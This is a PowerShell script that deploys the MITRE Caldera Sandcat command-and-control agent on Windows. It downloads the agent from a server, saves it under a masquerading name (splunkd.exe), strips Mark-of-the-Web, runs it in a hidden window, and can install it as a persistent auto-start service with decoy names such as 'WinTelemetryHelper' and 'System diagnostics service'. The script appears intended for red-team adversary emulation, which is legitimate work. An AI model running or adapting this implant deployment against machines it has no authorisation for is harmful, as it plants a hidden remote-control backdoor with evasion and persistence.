#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Deploys and launches the MITRE Caldera Sandcat agent on a Windows machine.

.DESCRIPTION
    Downloads the Sandcat agent binary from a running Caldera server using
    WebClient.DownloadData() + [io.file]::WriteAllBytes(), kills any existing
    instance at the drop path, then launches the agent via Start-Process with
    the correct argument string. Optionally installs as a persistent Windows
    service via NSSM or sc.exe.

.PARAMETER CalderaServer
    Base URL of the Caldera server including scheme and port.
    Example: http://192.168.10.108:8888

.PARAMETER Group
    Agent group to enrol into. Defaults to "red".

.PARAMETER C2Channel
    Contact channel for beacon traffic: http, udp, tcp, websocket.
    Defaults to "http".

.PARAMETER AgentPath
    Full path where the agent binary is written on disk.
    Defaults to C:\Users\Public\splunkd.exe

.PARAMETER InstallAsService
    If specified, installs the agent as a persistent auto-start Windows service.

.PARAMETER ServiceName
    Windows service name used when -InstallAsService is set.
    Defaults to "CalderaSandcat".

.PARAMETER Proxy
    Optional HTTP proxy for download and beacon traffic.
    Example: http://proxy.corp.local:8080

.PARAMETER ForceRedownload
    If specified, deletes an existing binary at AgentPath and re-downloads
    even if the file already exists.

.EXAMPLE
    # Basic deployment - mirrors the working one-liner
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.108:8888"

.EXAMPLE
    # Custom group, WebSocket C2, custom drop path
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.108:8888" `
        -Group "blue" -C2Channel "websocket" `
        -AgentPath "C:\ProgramData\Microsoft\splunkd.exe"

.EXAMPLE
    # Persistent service with blended name
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.108:8888" `
        -Group "red" -InstallAsService -ServiceName "WinTelemetryHelper"
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidatePattern('^https?://')]
    [string]$CalderaServer,

    [Parameter(Mandatory = $false)]
    [string]$Group = "red",

    [Parameter(Mandatory = $false)]
    [ValidateSet("http", "udp", "tcp", "websocket")]
    [string]$C2Channel = "http",

    [Parameter(Mandatory = $false)]
    [string]$AgentPath = "C:\Users\Public\splunkd.exe",

    [Parameter(Mandatory = $false)]
    [switch]$InstallAsService,

    [Parameter(Mandatory = $false)]
    [string]$ServiceName = "CalderaSandcat",

    [Parameter(Mandatory = $false)]
    [string]$Proxy = "",

    [Parameter(Mandatory = $false)]
    [switch]$ForceRedownload
)

# --------------------------------------------------------------
# Helper: timestamped coloured output
# --------------------------------------------------------------
function Write-Status {
    param([string]$Message, [string]$Level = "INFO")
    $colors = @{ INFO = "Cyan"; OK = "Green"; WARN = "Yellow"; ERROR = "Red" }
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$ts] [$Level] $Message" -ForegroundColor $colors[$Level]
}

# --------------------------------------------------------------
# Helper: kill any existing process running from AgentPath,
#         then delete the file - mirrors the one-liner's pattern
# --------------------------------------------------------------
function Remove-ExistingAgent {
    param([string]$Path)

    # Kill by module path (exact match - same technique as the one-liner)
    $running = Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Modules.FileName -like $Path }
    if ($running) {
        Write-Status "Stopping $($running.Count) existing agent process(es) at '$Path'" -Level "WARN"
        $running | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    }

    # Remove the binary so WriteAllBytes can write cleanly
    if (Test-Path $Path) {
        Remove-Item -Force $Path -ErrorAction Ignore
        Write-Status "Removed existing binary at '$Path'" -Level "WARN"
    }
}

# --------------------------------------------------------------
# Helper: download binary via DownloadData + WriteAllBytes
#         This is the method Caldera's own one-liner uses and
#         is required - DownloadFile does not work with this endpoint
# --------------------------------------------------------------
function Get-SandcatBinary {
    param([string]$Server, [string]$Destination, [string]$Proxy)

    $url = "$Server/file/download"
    Write-Status "Downloading agent from $url"

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("platform", "windows")
        $wc.Headers.Add("file", "sandcat.go")

        if ($Proxy) {
            $wc.Proxy = New-Object System.Net.WebProxy($Proxy, $true)
            Write-Status "Routing download through proxy: $Proxy"
        }

        # DownloadData returns a raw byte array - required by this endpoint
        $data = $wc.DownloadData($url)

        if (-not $data -or $data.Length -eq 0) {
            Write-Status "Server returned empty response - check Sandcat plugin is loaded on the server" -Level "ERROR"
            return $false
        }

        # Ensure destination directory exists
        $dir = Split-Path $Destination -Parent
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }

        [System.IO.File]::WriteAllBytes($Destination, $data)

        $size = (Get-Item $Destination).Length
        Write-Status "Agent written to '$Destination' ($size bytes)" -Level "OK"
        return $true
    }
    catch {
        Write-Status "Download failed: $_" -Level "ERROR"
        return $false
    }
}

# --------------------------------------------------------------
# Helper: launch agent as a hidden background process
#         Uses Start-Process -ArgumentList, which correctly passes
#         the argument string to the Go binary
# --------------------------------------------------------------
function Start-SandcatProcess {
    param(
        [string]$AgentBin,
        [string]$Server,
        [string]$Group,
        [string]$C2
    )

    # Build argument string - matches Caldera one-liner format exactly
    $argList = "-server $Server -group $Group"
    if ($C2 -ne "http") {
        $argList += " -contact $C2"
    }

    Write-Status "Launching agent..."
    Write-Status "  Binary    : $AgentBin"
    Write-Status "  Server    : $Server"
    Write-Status "  Group     : $Group"
    Write-Status "  C2        : $C2"
    Write-Status "  Arguments : $argList"

    try {
        $proc = Start-Process `
            -FilePath  $AgentBin `
            -ArgumentList $argList `
            -WindowStyle Hidden `
            -PassThru `
            -ErrorAction Stop

        Start-Sleep -Seconds 2

        # Confirm process is still alive after launch
        $alive = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        if ($alive) {
            Write-Status "Agent running with PID $($proc.Id)" -Level "OK"
        } else {
            Write-Status "Process launched but exited immediately - check binary integrity and server connectivity" -Level "WARN"
        }
        return $proc
    }
    catch {
        Write-Status "Failed to start agent: $_" -Level "ERROR"
        return $null
    }
}

# --------------------------------------------------------------
# Helper: install agent as a persistent Windows service
#         Tries NSSM first, falls back to sc.exe + batch wrapper
# --------------------------------------------------------------
function Install-SandcatService {
    param(
        [string]$Name,
        [string]$AgentBin,
        [string]$Server,
        [string]$Group,
        [string]$C2
    )

    $argList = "-server $Server -group $Group"
    if ($C2 -ne "http") { $argList += " -contact $C2" }

    # -- Option A: NSSM (recommended) --------------------------
    $nssm = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
    if ($nssm) {
        Write-Status "NSSM found - installing service via NSSM"
        & nssm.exe install    $Name $AgentBin $argList
        & nssm.exe set        $Name Start SERVICE_AUTO_START
        & nssm.exe set        $Name AppRestartDelay 5000
        & nssm.exe start      $Name
        Write-Status "Service '$Name' installed and started via NSSM" -Level "OK"
        return
    }

    # -- Option B: sc.exe + restart-loop batch wrapper ---------
    Write-Status "NSSM not found - falling back to sc.exe wrapper" -Level "WARN"

    $wrapperPath = [System.IO.Path]::ChangeExtension($AgentBin, ".bat")
    $line1 = '@echo off'
    $line2 = ':loop'
    $line3 = '"' + $AgentBin + '" ' + $argList
    $line4 = 'timeout /t 10 /nobreak >nul'
    $line5 = 'goto loop'
    $wrapperContent = $line1 + "`r`n" + $line2 + "`r`n" + $line3 + "`r`n" + $line4 + "`r`n" + $line5
    Set-Content -Path $wrapperPath -Value $wrapperContent -Encoding ASCII

    $binPath = 'cmd.exe /c "' + $wrapperPath + '"'
    sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name | Out-Null
    sc.exe description $Name "System diagnostics service" | Out-Null
    sc.exe start $Name | Out-Null

    Start-Sleep -Seconds 2
    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq "Running") {
        Write-Status "Service '$Name' is running" -Level "OK"
    } else {
        Write-Status "Service '$Name' may not have started cleanly - verify with: Get-Service '$Name'" -Level "WARN"
    }
}

# --------------------------------------------------------------
# Helper: stop and remove a service before reinstalling
# --------------------------------------------------------------
function Remove-ExistingService {
    param([string]$Name)
    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Status "Removing existing service '$Name'" -Level "WARN"
        Stop-Service -Name $Name -Force -ErrorAction SilentlyContinue
        sc.exe delete $Name | Out-Null
        Start-Sleep -Seconds 2
    }
}

# ==============================================================
#  MAIN
# ==============================================================

Write-Status "==============================================="
Write-Status " MITRE Caldera - Sandcat Agent Deployer"
Write-Status " Server  : $CalderaServer"
Write-Status " Group   : $Group"
Write-Status " C2      : $C2Channel"
Write-Status " Path    : $AgentPath"
Write-Status "==============================================="

# 1. Confirm server is reachable
Write-Status "Checking server connectivity..."
try {
    $ping = Invoke-WebRequest -Uri "$CalderaServer/ping" `
        -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
    Write-Status "Server reachable (HTTP $($ping.StatusCode))" -Level "OK"
}
catch {
    Write-Status "Cannot reach '$CalderaServer' - verify the server is running and the port is accessible" -Level "ERROR"
    exit 1
}

# 2. Kill existing instance and re-download, or skip if binary exists
if ((Test-Path $AgentPath) -and -not $ForceRedownload) {
    Write-Status "Binary already present at '$AgentPath' - skipping download (use -ForceRedownload to override)" -Level "WARN"
} else {
    # Always kill and clean before writing to avoid file-lock errors
    Remove-ExistingAgent -Path $AgentPath

    $ok = Get-SandcatBinary -Server $CalderaServer -Destination $AgentPath -Proxy $Proxy
    if (-not $ok) {
        Write-Status "Aborting - binary download failed" -Level "ERROR"
        exit 1
    }
}

# 3. Strip Mark-of-the-Web alternate data stream
Unblock-File -Path $AgentPath -ErrorAction SilentlyContinue

# 4a. Persistent service mode
if ($InstallAsService) {
    Remove-ExistingService -Name $ServiceName
    Install-SandcatService `
        -Name     $ServiceName `
        -AgentBin $AgentPath `
        -Server   $CalderaServer `
        -Group    $Group `
        -C2       $C2Channel

# 4b. One-shot process mode (default)
} else {
    # Kill any stale instance that survived step 2 (e.g. if -ForceRedownload was not set)
    $stale = Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Modules.FileName -like $AgentPath }
    if ($stale) {
        Write-Status "Stopping stale agent process before relaunch" -Level "WARN"
        $stale | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    }

    $proc = Start-SandcatProcess `
        -AgentBin $AgentPath `
        -Server   $CalderaServer `
        -Group    $Group `
        -C2       $C2Channel

    if ($proc) {
        Write-Status "Agent deployed. Check the Caldera UI under Agents." -Level "OK"
        Write-Status "To stop: Stop-Process -Id $($proc.Id) -Force" -Level "INFO"
    }
}

Write-Status "Done." -Level "OK"